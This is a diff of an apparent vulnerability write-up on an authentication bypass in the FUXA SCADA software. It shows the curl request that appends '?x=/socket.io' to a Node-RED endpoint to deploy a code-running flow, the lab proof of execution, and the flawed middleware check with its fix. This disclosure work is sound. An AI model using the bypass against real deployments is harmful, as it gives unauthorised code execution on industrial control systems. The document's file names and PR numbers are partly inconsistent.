@@ -149,7 +149,9 @@ payload:
 ]
 ```
 
-Save it in a file **payload.json**, then send the payload in the POST request. This is the response:
+The flow is very minimal, one inject (timestamp) and one function node. It is just executing a function once the flow is
+deployed and triggered by 'inject' after 0.1s delay on startup. Save it in a file **payload.json**, then send the payload in
+the POST request. This is the response:
 
 ```
 > curl -iX POST --json @leak.json localhost:1881/nodered/flows?x=/socket.io
@@ -163,6 +165,30 @@ Connection: keep-alive
 Keep-Alive: timeout=5
 ```
 
-Well, well, well. Looks like something just happened. How can we check if a flow is created? Let's look at http://localhost:1881/flows
+Well, well, well. Looks like something just happened. Let's look at http://localhost:1881/flows to check the created flow.
 
 ![Flow created after the path-manipulation bypass](/images/analyzing-scada-software-cve/created-flow-after-path-manipulation.png "Figure 2. Created Flow After Bypassing Through Path Manipulation")
+
+We can see the flow is created and the function does match with the payload we sent before. Let's see what's in the `/tmp` directory.
+
+```
+> podman exec fuxa ls /tmp; echo "FILE content: $(podman exec fuxa cat /tmp/fuxa-rce-proof.txt)"
+fuxa-rce-proof.txt
+scarf-js-history-root.log
+FILE content: FUXA labproof
+```
+
+There it is, we just executed a code inside the server after bypassing the security by manipulating the path. This is the reported
+vulnerability in [CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945). This vulnerability is introduced by [PR #2182](https://github.com/frangoteam/FUXA/pull/2182)
+which added authentication to `/nodered/*` endpoint but missed to properly handle `/dashboard` and `/socket.io` path. This
+piece of code executed before the authentication happens,
+
+```js
+const url = req.originalUrl || req.url || req.path;
+if (url.includes('/dashboard') || url.includes('/socket.io')) return next();
+```
+
+Since `req.originalUrl` is retaining the original URL, the path `/nodered/flows?x=/socket.io` will be stored exactly the
+same in `req.originalUrl`. When this match, the code skip the authentication part on the next line and proceed to process the
+request. So it shouldn't include the query parameter at all but only the path, hence on [PR #2660](https://github.com/frangoteam/FUXA/pull/2260/files)
+it replaces it with `req.baseUrl`.
